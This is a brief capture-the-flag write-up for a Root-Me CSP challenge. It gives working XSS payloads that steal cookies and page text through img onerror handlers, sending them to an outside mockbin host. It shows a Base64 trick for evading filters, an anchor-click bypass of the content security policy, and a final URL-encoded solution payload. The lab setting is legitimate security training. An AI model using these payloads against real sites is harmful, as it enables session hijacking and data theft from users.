# CSP Inline code

## Initial attempt

```javascript
<img src="#" onerror="(() => {window.open('https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io')})()" />
```

```javascript
<img src="#" onerror="(() => {var link='https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/'+document.cookie; var i=document.createElement('img'); i.src=link; document.getElementsByTagName('p')[0].appendChild(i);})()" />
```

Problem: string `https` is not allowed in anywhere in the payload it seems

## Base64 encoding the link

```javascript
<img src="#" onerror="(() => {var link=atob('aHR0cHM6Ly9iNWUwMmQ2MTNjYTQ0YjczODRlMDI5MDEyNWExNDQ4ZS5hcGkubW9ja2Jpbi5pby8K')+document.cookie; var i=document.createElement('img'); i.src = link; document.getElementsByTagName('p')[0].appendChild(i);})()" />
```

Problem: violates `img-src: 'self'`

## Simulating a click on anchor

```javascript
<img src="#" onerror="(() => {var p = document.getElementsByTagName('p')[0]; var link=atob('aHR0cHM6Ly9iNWUwMmQ2MTNjYTQ0YjczODRlMDI5MDEyNWExNDQ4ZS5hcGkubW9ja2Jpbi5pby8K')+'?p='+p.innerText; var i=document.createElement('a'); i.href=link; p.appendChild(i); i.click()})()" />
```

Solution payload
```text
http://challenge01.root-me.org:58008/page?user=%3Cimg+src%3D%22%23%22+onerror%3D%22%28%28%29+%3D%3E+%7Bvar+p+%3D+document.getElementsByTagName%28%27p%27%29%5B0%5D%3B+var+link%3Datob%28%27aHR0cHM6Ly9iNWUwMmQ2MTNjYTQ0YjczODRlMDI5MDEyNWExNDQ4ZS5hcGkubW9ja2Jpbi5pby8K%27%29%2B%27%3Fp%3D%27%2Bp.innerText%3B+var+i%3Ddocument.createElement%28%27a%27%29%3B+i.href%3Dlink%3B+p.appendChild%28i%29%3B+i.click%28%29%7D%29%28%29%22+%2F%3E
```


